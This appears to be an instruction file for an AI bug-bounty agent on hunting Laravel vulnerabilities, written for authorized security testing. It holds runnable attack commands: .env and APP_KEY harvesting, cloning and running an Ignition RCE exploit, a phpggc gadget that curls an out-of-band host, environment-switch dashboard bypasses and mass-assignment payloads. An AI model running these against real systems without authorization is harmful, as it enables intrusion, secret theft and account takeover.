---
name: hunt-laravel
description: Hunt Laravel specific vulnerabilities — APP_DEBUG leakage (Whoops/Ignition HTML or JSON), Telescope/Horizon/Pulse/Debugbar unauthorized access, Ignition RCE (CVE-2021-3129, facade/ignition <=2.5.1), CVE-2024-52301 --env=local via register_argc_argv, Livewire snapshot tampering and CVE-2025-54068 as a version lead, signed URL manipulation, queue unserialize when you can already write a job, Eloquent mass assignment, APP_KEY decrypt/session forge vs legacy cookie unserialize, .env and bootstrap/cache/config.php exposure. Use when the target runs Laravel (PHP) — X-Powered-By, laravel_session, XSRF-TOKEN, /storage/, livewire.js, wire:snapshot, or Ignition.
sources: hackerone_public, cve_database
report_count: 14
---

# HUNT-LARAVEL — Laravel Specific Vulnerabilities

## Crown Jewel Targets

`APP_DEBUG=true` leaks env and, only on old Ignition, unauthenticated RCE. A leaked `APP_KEY` is decrypt-and-forge until you prove a second user's session or an OOB gadget — it is not automatically RCE.

**Highest-value findings:**
- **Ignition RCE (CVE-2021-3129)** — `facade/ignition` ≤ 2.5.1 (Laravel < 8.4.2, and any older app that still shipped that package) and `/_ignition/health-check` reports `can_execute_commands: true`
- **Telescope / Horizon / Pulse / Debugbar** — request logs, queries, failed jobs, env, session. If they 403, still try `?--env=local` (CVE-2024-52301)
- **APP_KEY** — decrypt secrets and, when the cookie format allows it, forge a session. Legacy `unserialize` (CVE-2018-15133) is a separate, version-gated step
- **Livewire** — snapshot checksum is an HMAC under `APP_KEY`; CVE-2025-54068 (< 3.6.4) is a hydration lead, not a 500
- **Signed URL / mass assignment** — wrong params accepted, or an admin field that then works

---

## Phase 1 — Fingerprint Laravel

```bash
# Laravel-specific indicators
curl -sI https://$TARGET/ | grep -i "laravel_session\|x-powered-by.*php"
curl -s https://$TARGET/ | grep -i "laravel\|Illuminate\|csrf-token"

# Common Laravel paths
for path in /storage /public /resources "/vendor/laravel" "/.env" "/artisan"; do
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" "https://$TARGET$path")
  [ "$STATUS" != "404" ] && echo "$path: $STATUS"
done

# Check error page (trigger 404)
curl -s "https://$TARGET/definitely-does-not-exist-xyz" | grep -i "laravel\|Whoops\|Ignition\|symfony"

# Version hints: composer artifacts, framework strings, Ignition footer
curl -s "https://$TARGET/vendor/composer/installed.json" | grep -A2 '"laravel/framework"'
curl -s "https://$TARGET/" -I | grep -i "x-powered-by"
```

**Decision tree (adapts to any Laravel version):**
1. Error page is Whoops/Ignition **or** `Accept: application/json` returns a stack/`exception` → `APP_DEBUG=true`. Leak of env/`APP_KEY` is the finding. Ignition RCE only if Phase 2's version gate passes.
2. `/.env`, a backup, or `/bootstrap/cache/config.php` readable → Phase 4. Prove decrypt or a forged session. Unserialize RCE only on the legacy path.
3. `/telescope`, `/telescope-api`, `/horizon`, `/pulse`, or `/_debugbar` returns data without a login → Phase 3. If those 403, still try `?--env=local` (Phase 3b) before closing the dashboard branch.
4. `wire:snapshot` / `livewire.js` → Phase 7.
5. Signed URLs (`?signature=`) → Phase 5. Model create/update → Phase 6.
Run every branch that fingerprints positive. Debug mode off does not end the hunt.

---

## Phase 2 — Debug Mode & Ignition RCE (CVE-2021-3129)

```bash
# HTML Whoops and the JSON error page are both debug mode
curl -s "https://$TARGET/nonexistent" | grep -i "Whoops\|APP_DEBUG\|Ignition"
curl -s "https://$TARGET/nonexistent" -H 'Accept: application/json' | head -c 500

# health-check 200 is NOT RCE. Vulnerable Ignition reports can_execute_commands true
# and facade/ignition is <= 2.5.1 (Laravel framework pin < 8.4.2, or the package
# left installed on an older app). false, or execute-solution 404, = patched.
curl -s "https://$TARGET/_ignition/health-check"
curl -s "https://$TARGET/vendor/composer/installed.json" | grep -A2 '"facade/ignition"'

# Only when that gate passes. The public chain is ambionics/laravel-ignition-rce
# (clear log, plant phar, trigger — a single execute-solution POST is not RCE).
[ -f /tmp/laravel-rce/exploit.php ] || git clone --depth 1 https://github.com/ambionics/laravel-ignition-rce /tmp/laravel-rce
php /tmp/laravel-rce/exploit.php https://$TARGET "id"
# Confirm uid= or one OOB callback, then stop.
```

---

## Phase 3 — Laravel Telescope & Horizon

```bash
# Telescope — request/response logs, DB queries, jobs, cache, events
curl -s "https://$TARGET/telescope" | grep -i "telescope\|laravel"
# Default Telescope API is /telescope-api, not /telescope/api. Try both.
for p in /telescope-api/requests /telescope/telescope-api/requests /telescope/api/requests \
         /telescope-api/commands /telescope-api/environment; do
  echo "== $p"; curl -s "https://$TARGET$p" | head -c 300; echo
done

# Horizon — queue worker dashboard
curl -s "https://$TARGET/horizon" | grep -i "horizon\|laravel"
curl -s "https://$TARGET/horizon/api/stats" | python3 -m json.tool 2>/dev/null
curl -s "https://$TARGET/horizon/api/jobs/failed" | python3 -m json.tool 2>/dev/null | head -50
# Failed job payloads often contain full request data including auth tokens

# Common paths
for path in /telescope /telescope-api/requests /horizon /horizon/api/stats \
            /pulse /_debugbar /_debugbar/open /log-viewer; do
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" "https://$TARGET$path")
  [ "$STATUS" = "200" ] && echo "[+] ACCESSIBLE: $TARGET$path"
done
```
A 200 HTML shell with a login form is not access. Quote a query, a token, a failed-job payload, or an env value. `/_debugbar/open` often includes the session of recent requests — one request you made, plus one that is not yours, is the proof.

### Phase 3b — CVE-2024-52301 (`?--env=local`)

When PHP `register_argc_argv=On` (common in Docker PHP images), Laravel used `$_SERVER['argv']` for environment detection on web SAPIs. A query string can switch `APP_ENV` for that request. Telescope/Horizon/Pulse gates are often `local`-only; `app()->environment('local')` also unlocks debug helpers and magic login.

Patched: 6.20.45 / 7.30.7 / 8.83.28 / 9.52.17 / 10.48.23 / 11.31.0 (and Laravel 12+). Unpatched **and** `register_argc_argv=Off` = not this CVE.

```bash
# Baseline the 403/login page, then one env switch. The query token is literal
# `--env=local` (PHP argv), not a named key. Also try `dev` / `testing`.
curl -s -o /tmp/t0 -w '%{http_code} %{size_download}\n' "https://$TARGET/telescope"
curl -s -o /tmp/t1 -w '%{http_code} %{size_download}\n' "https://$TARGET/telescope?--env=local"
diff -q /tmp/t0 /tmp/t1 || echo "body-diff — inspect t1"
curl -s "https://$TARGET/horizon/api/stats?--env=local" | head -c 300
curl -s "https://$TARGET/nonexistent?--env=local" | grep -i "Whoops\|Ignition"
```

**Proof:** body-diff vs the baseline — Telescope/Horizon JSON, a query, another user's request, or Whoops/env that was absent without the param. Status-only 200 on the HTML shell is not enough. One dashboard, then stop. Chain into Phase 4 if `APP_KEY` appears.

---

## Phase 4 — .env File & APP_KEY Exposure

```bash
# Direct .env access
curl -s "https://$TARGET/.env" | grep -i "APP_KEY\|DB_PASSWORD\|SECRET\|KEY"
curl -s "https://$TARGET/.env.production"
curl -s "https://$TARGET/.env.backup"
curl -s "https://$TARGET/.env.local"

# APP_KEY sources. bootstrap/cache/config.php is the compiled config (APP_KEY + DB).
for p in /.env /.env.bak /.env.old /.env.save /.env.dev /.env.prod \
         /bootstrap/cache/config.php /storage/logs/laravel.log /config/app.php; do
  curl -s "https://$TARGET$p" | grep -iE "APP_KEY|base64:" && echo " ^ from $p"
done
```

**What a leaked APP_KEY actually is:**
- Decrypt one value the app encrypted (`encrypt()`, a cookie you can read back) and quote the plaintext. That proves the key.
- **Session forge:** re-encrypt a cookie the app accepts as a *different test user* and show that user's marker. On the file/database session drivers the cookie is often just an encrypted session id — knowing the key does not invent another user's id. Claim ATO only after that second session loads.
- **CVE-2018-15133 / phpggc:** only when decrypted bytes are `unserialize`d. That is Laravel < 5.6.30, or a current app whose encrypter still serializes (`EncryptCookies::$serialize = true`, or `unserialize(decrypt(...))` in app code). One OOB callback. A key with no gadget execution is not RCE. `XSRF-TOKEN` is usually not the serialized cookie.

```bash
# Legacy serialize path only, after the version/code gate above:
php phpggc Laravel/RCE9 system 'curl http://UNIQUE.COLLAB/laravel-rce' -b -f
# Encrypt with the leaked APP_KEY, send as the session cookie, one request.
# Callback or uid= is the proof. No error is not proof.
```

---

## Phase 5 — Signed URL Manipulation

```bash
# Laravel signed URLs contain signature param: ?signature=HASH
# Find signed URL endpoints
cat recon/$TARGET/urls.txt | grep "signature="

# Test: modify a non-signature parameter — should fail validation
SIGNED_URL="https://$TARGET/unsubscribe?user=123&email=test@test.com&signature=VALID_SIG"

# Modify user ID → should fail if properly signed
curl -s "${SIGNED_URL/user=123/user=999}"

# Test signature bypass: remove signature entirely
curl -s "${SIGNED_URL/&signature=VALID_SIG/}"

# Test: does the app validate ALL parameters or just some?
curl -s "${SIGNED_URL}&extra=malicious"
# HPP: some verifiers sign the first user and the action uses the last
curl -s "${SIGNED_URL/user=123/user=123&user=999}"
```

---

## Phase 6 — Mass Assignment via Eloquent

```bash
# Laravel Eloquent ORM — if model uses $guarded=[] or $fillable=[] improperly
# Test: add extra fields to update/create requests

# Profile update
curl -s -X POST "https://$TARGET/api/profile" \
  -H "Cookie: laravel_session=SESSION" \
  -H "Content-Type: application/json" \
  -d '{"name": "Test", "email": "test@test.com", "is_admin": true, "role": "admin"}'

# Registration
curl -s -X POST "https://$TARGET/api/register" \
  -H "Content-Type: application/json" \
  -d '{"name": "Test", "email": "test@new.com", "password": "test123", "verified": true, "admin": 1}'
```

---

## Phase 7 — Livewire, Pulse, and queues

```bash
# Fingerprint. Checksum::generate HMACs json_encode(snapshot without checksum)
# with app('encrypter')->getKey() — APP_KEY after stripping a base64: prefix and decoding.
curl -s "https://$TARGET/" | grep -o 'livewire[^" ]*\|wire:snapshot' | head
curl -s "https://$TARGET/vendor/composer/installed.json" | grep -A2 '"livewire/livewire"'
```

- **APP_KEY known:** recompute that HMAC, change one public property on a component you own, and read it back. A rejected snapshot means the JSON flags or the key bytes do not match — not a finding. Tampering is proven only when the property sticks. It is RCE only if a method you actually invoke returns `uid=` or hits your OOB host. One request.
- **CVE-2025-54068:** Livewire ≥ 3.0.0-beta.1 and < 3.6.4, hydration RCE, specific component shapes, no login required. Version match is a **lead**. Proof is command output or one OOB callback. A 500 or a stack trace is not RCE. v2 is not this CVE.
- **Pulse** `/pulse` is the Laravel 10+ dashboard. Same proof bar as Telescope: a real query, user, or env value, unauthenticated.
- **Queue:** if you already have a write into the queue backend (exposed Redis, no scanning), one serialized job the worker will `unserialize`, OOB, stop. Do not probe Redis with a wordlist. Horizon failed-job **read** stays Phase 3.

---

## Chain Table

| Laravel finding | Chain to | Impact |
|----------------|----------|--------|
| Debug + `can_execute_commands: true` | CVE-2021-3129, one `id` or OOB | Critical RCE |
| Debug, Ignition patched | Env / `APP_KEY` in the trace | High, or the Phase 4 chain |
| Telescope / Horizon / Pulse / Debugbar | Queries, tokens, another user's request | High |
| `?--env=local` (CVE-2024-52301) | Unlocks local-only dashboards / debug | High, or the Phase 4 chain |
| APP_KEY, legacy unserialize | CVE-2018-15133, one OOB | Critical RCE |
| APP_KEY, modern encrypter | Forged cookie loads another test user | Critical ATO, only if that page loads |
| Livewire < 3.6.4 or checksum forge | Hydration or property write-back | RCE only with output; else the property change |
| Signed URL bypass | Action on an id you do not own | Medium–High |
| Mass assignment | `is_admin` then one admin-only action | Critical |

---

## Validation

- **Ignition RCE:** `uid=` or one OOB hit, and the health-check/version gate was true. The log-write POST alone is not RCE.
- **APP_KEY → RCE:** only on the legacy unserialize path, same OOB/`uid=` bar.
- **APP_KEY → ATO:** forged cookie returns a specific other test user's profile. Decrypted ciphertext with no second session is key disclosure, not ATO.
- **Telescope/Horizon/Pulse/Debugbar:** a query, token, or another user's request you can tie to an account. The login page is not the finding.
- **CVE-2024-52301:** same dashboard/debug proof, and only with the `--env` param. Without it the gate still holds. Version string alone is a lead.
- **Livewire:** property write-back you can read, or command/OOB. Version string alone is a lead.
- **Mass assignment:** `is_admin: true` accepted AND the account then performs an admin-only action.

**Severity:** Ignition or legacy-unserialize RCE with output, or a forged session that loads another user: **Critical**. Dashboards with sensitive data: **High**. Key material with no second effect: **High** key disclosure, not Critical RCE. Mass assignment to a working admin action: **Critical**.

## Before you report — dedup gate

Fresh/changed surface first (see `dedup-novelty`, `changed-js-deepdive`), and hunt classes in yield
order (`/yield`). Before drafting ANY finding from this skill, run the dedup gate:

```bash
python3 engine/dedup.py check --program <program> --class <class> --url "<endpoint>" --title "<title>"
```

`NOVEL` -> proceed to `/validate`. `LIKELY_DUP` -> stop unless you can prove a concrete differentiator
(different endpoint/param/impact, or a bypass of the deployed fix -> report as a regression).
